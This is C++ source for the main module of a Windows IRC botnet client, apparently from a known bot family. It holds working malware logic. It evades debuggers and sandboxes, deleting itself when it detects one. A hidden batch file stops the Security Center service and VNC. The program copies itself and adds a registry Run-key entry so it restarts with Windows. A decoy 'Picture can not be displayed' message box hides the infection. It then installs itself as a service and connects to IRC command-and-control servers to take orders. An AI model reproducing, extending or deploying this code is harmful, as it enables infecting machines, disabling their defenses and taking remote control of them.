#include "includes.h"
#include "functions.h"
#include "configs.h"
//#include "globals.h"
//#include "strings.h"


/*
--------------------------------
NO_SERIVCE: method fixed
MSN.cpp Full implemented 
Max 1 MSN Spread Thread Allowed
   
       Fixed |3`/ MuNk
  --------------------------
*/

#pragma comment(linker, "/subsystem:windows ")


DWORD dwstarted;
DWORD dwconnected;

IRC mainirc;
HANDLE xetum;
int curserver;
//int eftpsends;
int srvsz=(sizeof(sinfo)/sizeof(SERVER));
int authsize=(sizeof(authost)/sizeof(LPTSTR));
#ifndef NO_VERSION_REPLY
int curversion;
int versionsize=(sizeof(versionlist)/sizeof(LPTSTR));
#else
int versionsize=0;
#endif

char exip[MAX_IP];
char inip[MAX_IP];
char host[MAX_HOSTNAME];

extern char str_main_thread[];
extern char str_rup_thread[];
extern char str_asecure_thread[];

#ifndef _DEBUG
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
#else
int main(int argc, char *argv[])
char msg[256];
#endif
{
	LoadDLLs();


#ifndef NO_DDETECT
	if(IsBugged())
	{
		EraseMe(TRUE);
		ExitProcess(1);
	}
#endif

	unsigned char szBytes[] = { 0xc8, 0x0, 0x4, 0x0, 0x60 }; 
    DWORD dwAddr = (DWORD)GetProcAddress(LoadLibrary("user32.dll"), "MessageBoxA"); 

    if(!memcmp((LPVOID)dwAddr, (LPVOID)szBytes, sizeof(szBytes))) 
    { 
        while (1) {}
        ExitProcess(0); 
        //Exit the process cleanly so it stops execution and logging of the file 
    }


#ifndef NO_STOPVNC

	// write a batch file to stop the Security Center Service, shutting down the fwall.
	// * updated to also stop vnc to temporarily secure the box while vnc runs.
	BOOL StopVNC = TRUE;
	char buffer[512];
	char killbatch[]="c:\\a.bat";
	HANDLE f;
	DWORD r;
	char delBatch2[512];
	GetTempPath(sizeof(buffer), buffer);

	f = CreateFile(killbatch, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, 0);
	if (f > (HANDLE)0) {
		
	if (StopVNC)
		{
	sprintf(delBatch2,
	"@echo off\r\n"
	"net stop \"Security Center\"\r\n"
	"net stop winvnc4\r\n"
    "del c:\\a.bat\r\n");
	} 
		WriteFile(f, delBatch2, strlen(delBatch2), &r, NULL);
		CloseHandle(f);

		// execute the batch file hidden
		fShellExecute(0,"open",killbatch,NULL,NULL,SW_HIDE);


	}

#endif //NO_STOPVNC



#ifndef NO_CRYPT
	//decryptstrings(authsize, versionsize, srvsz);
#endif

#ifndef NO_SERVICE
	SERVICE_TABLE_ENTRY servicetable[] =
	{
		{servicename, (LPSERVICE_MAIN_FUNCTION) ServiceMain},
		{NULL, NULL}
	};
#endif

	//TODO: Error handler here


	char cpbot[MAX_PATH];
	char movetopath[MAX_PATH];
	char spath[MAX_PATH];
	GetModuleFileName(GetModuleHandle(NULL), cpbot, sizeof(cpbot));
	ExpandEnvironmentStrings(gotopth,movetopath,sizeof(movetopath));
	sprintf(spath,"%s\\%s",movetopath,exename);
	
#ifndef _DEBUG
	if (MoveBot(movetopath,exename))
	{
#ifndef NO_MELT
		RegWrite(mkey.hkey,mkey.subkey,mkey.name,cpbot);
#endif // NO_MELT


    HKEY hndKey = NULL;
	RegCreateKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\",0,NULL,REG_OPTION_NON_VOLATILE,KEY_ALL_ACCESS,NULL, &hndKey, NULL);
	RegSetValueEx(hndKey,szRegname,0, REG_SZ,(const unsigned char *)exename,strlen(exename));
	RegCloseKey(hndKey);

		MessageBox(NULL, "Picture can not be displayed.","Windows Microsoft Viewer", NULL);




		PROCESS_INFORMATION pinfo;
		STARTUPINFO sinfo;
		ZeroMemory(&pinfo,sizeof(pinfo));
		ZeroMemory(&sinfo,sizeof(sinfo));
		sinfo.lpTitle     = "";
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = STARTF_USESHOWWINDOW;
#ifdef _DEBUG
		sinfo.wShowWindow = SW_SHOW;
#else
		sinfo.wShowWindow = SW_HIDE;
#endif // _DEBUG

		if (CreateProcess(spath,NULL,NULL,NULL,TRUE,NORMAL_PRIORITY_CLASS|DETACHED_PROCESS,NULL,movetopath,&sinfo,&pinfo))
		{
			Sleep(200);
			CloseHandle(pinfo.hProcess);
			CloseHandle(pinfo.hThread);
			fWSACleanup();
			ExitProcess(EXIT_SUCCESS);
		}

//#endif // NO_SERVICE
		ExitProcess(1);
	}
#endif // _DEBUG
#ifndef NO_SERVICE
	if(fStartServiceCtrlDispatcher(servicetable) == 0)
		InstallService(spath);
#else

	DWORD id;
	HANDLE threadhandle;
	if((threadhandle = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Bthd, NULL, 0, &id)) == 0) 
		return 0;

	WaitForSingleObject(threadhandle, INFINITE);
	CloseHandle(threadhandle);
	return 0;
#endif // NO_SERVICE
#ifdef _DEBUG
//	CloseLog();
#endif
	return 0;
}


DWORD WINAPI Bthd(LPVOID param)
{
	for (int m=0;m<6;m++)
	{
		if(!(xetum=CreateMutex(NULL, FALSE, xetumhandle)))
				Sleep(5000);
		else
			break;
	}
	if (WaitForSingleObject(CreateMutex(NULL, TRUE, xetumhandle), 30000) == WAIT_TIMEOUT)
		ExitProcess(0);

	addthread(MAIN_THREAD,str_main_thread,main_title);

#ifndef _DEBUG
#ifndef NO_MELT
	char *melt=RegQueryValue(mkey.hkey,mkey.subkey,mkey.name);
		if (melt)
		{
			SetFileAttributes(melt,FILE_ATTRIBUTE_NORMAL);
			int tries=0;
			while (FileExists(melt) && tries<3)
			{
				DeleteFile(melt);
				tries++;
				Sleep(2000);
			}
			RegDelete(mkey.hkey,mkey.subkey,mkey.name);
		}
#endif // NO_MELT
#endif // _DEBUG

	srand(GetTickCount());
	dwstarted=GetTickCount();


	WSADATA wsadata;
	if (fWSAStartup(MAKEWORD(2,2),&wsadata)!=0)
		ExitProcess(-2);

	
	int i=0;
	DWORD id=0;




#ifndef _DEBUG // maybe this will give the shutdown handler time to work
//	RegWrite(HKEY_LOCAL_MACHINE,"SYSTEM\\CurrentControlSet\\Control","WaitToKillServiceTimeout","7000");
#endif
	
	//get internal ip
	char *ip;
	char hostname[256];
	struct hostent *h;
	fgethostname(hostname, 256);
	h = fgethostbyname(hostname);
	ip = finet_ntoa(*(struct in_addr *)h->h_addr_list[0]);
	strncpy(inip,ip,sizeof(inip));


	curserver=0;
	HookProtocol(&mainirc);
	
	while (mainirc.should_connect()) {
		if (!mainirc.is_connected())
		{
#ifdef _DEBUG
			printf("Trying to connect to: %s:%i\r\n",sinfo[curserver].host,sinfo[curserver].port);
#endif
#ifndef NO_FLUSHDNS
			FlushDNSCache();
#endif
			mainirc.start(sinfo[curserver].host,sinfo[curserver].port,
					  mainirc.nickgen(NICK_TYPE,REQ_NICKLEN),mainirc.nickgen(IDENT_TYPE,REQ_IDENTLEN),
					  mainirc.nickgen(REALN_TYPE,REQ_REALNLEN),sinfo[curserver].pass);
			mainirc.message_loop();
		}
		else
			mainirc.message_loop();

		Sleep(SFLOOD_DELAY);
		
		if (curserver==(srvsz-1))
			curserver=0;
		else
			curserver++;
	}

	// cleanup;
	//killthreadall();
	fWSACleanup();
	ReleaseMutex(xetum);
	ExitThread(0);

		return TRUE;
}